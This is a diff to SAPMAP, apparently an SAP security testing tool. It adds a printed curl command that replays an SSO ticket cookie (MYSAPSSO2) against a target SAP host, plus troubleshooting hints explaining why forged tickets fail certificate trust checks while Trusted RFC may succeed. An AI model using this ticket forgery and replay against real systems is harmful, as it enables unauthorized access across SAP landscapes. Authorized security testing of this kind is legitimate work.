@@ -6720,6 +6720,22 @@ def create_app(api: SAPMAPApi) -> Bottle:
                     continue
                 ticket = r["ticket"]
 
+                # Surface a manual-test curl so the operator can
+                # repeat the probe outside SAPMAP.
+                tgt_host = (target_node.ip or target_node.hostname
+                            or "?")
+                tgt_inst = ((target_node.instances[0].instance_nr
+                             if target_node.instances else "00")
+                            or "00").zfill(2)
+                try:
+                    https_port = 44300 + int(tgt_inst)
+                except ValueError:
+                    https_port = 44300
+                print(f"[*] {target_sid}: manual test command:")
+                print(f"      curl -k -i "
+                      f"'https://{tgt_host}:{https_port}/sap/bc/ping' "
+                      f"--cookie 'MYSAPSSO2={ticket.cookie_b64}'")
+
                 # Replay against this specific target
                 print(f"[*] {target_sid}: replaying ticket via "
                       f"{', '.join(channels)}")
@@ -6739,12 +6755,22 @@ def create_app(api: SAPMAPApi) -> Bottle:
                     err_lower = ev.lower()
                     if "401" in ev or "unauthorized" in err_lower:
                         print(f"            hint: 401 = signature/"
-                              f"recipient validation FAILED. Check: "
-                              f"login/accept_sso2_ticket=1 on "
-                              f"{target_sid}, OR our PSE cert isn't "
-                              f"registered in target's STRUSTSSO2 "
-                              f"(STRUST on {target_sid}, applic "
-                              f"'SYSPSEAPPLSRV', certificate list)")
+                              f"recipient validation FAILED.")
+                        print(f"            MOST LIKELY: {sid}'s "
+                              f"SAPSYS cert is NOT in {target_sid}'s "
+                              f"STRUSTSSO2 trustbox.")
+                        print(f"            Check STRUSTSSO2 on "
+                              f"{target_sid} -> System PSE -> "
+                              f"Certificate List. If empty, the "
+                              f"target accepts NO MYSAPSSO2 tickets.")
+                        print(f"            Note: legacy "
+                              f"license-number based Trusted RFC "
+                              f"(RFCTRUST) works WITHOUT STRUSTSSO2 "
+                              f"certs — that's why Trusted RFC may "
+                              f"succeed while ticket forgery fails. "
+                              f"Cert-based trust must be set up "
+                              f"separately (SM59 'Current User' + "
+                              f"trust button, or manual cert import).")
                     elif "403" in ev or "forbidden" in err_lower:
                         print(f"            hint: 403 = ticket "
                               f"VALIDATED, but session start FAILED. "
